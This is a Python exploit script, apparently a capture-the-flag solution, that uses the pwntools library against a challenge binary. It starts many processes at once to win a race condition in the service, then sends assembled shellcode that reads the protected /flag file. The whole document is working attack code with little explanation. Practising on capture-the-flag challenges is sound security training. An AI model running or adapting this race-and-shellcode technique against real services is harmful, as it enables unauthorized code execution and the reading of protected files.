#!/usr/bin/env python3
import sys
from time import sleep
from multiprocessing import Process
import pwn



def start(argv=[], *a, **kw):
    if pwn.args.GDB:  # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.REMOTE:  # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # run locally, no GDB
        return pwn.process([binPath] + argv, *a, **kw)

binPath = "/challenge/challenge1"
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
pwn.context.log_level = "critical"

def send_work():
    io = start()
    io.sendline(b"work")
    print(io.recvline())
    io.close()

def send_fun():
    io = start()
    io.sendline(b"have some fun")
    print(io.recvline())
    io.sendline(pwn.asm(pwn.shellcraft.cat("/flag")))
    io.close()

'''
Steps for debugging
send_fun()
send_work()
'''

for i in range(100):
    work_thread = Process(target=send_work)
    work_thread.start()
    work_thread1 = Process(target=send_work)
    work_thread1.start()
    work_thread2 = Process(target=send_work)
    work_thread2.start()
    fun_thread = Process(target=send_fun)
    fun_thread.start()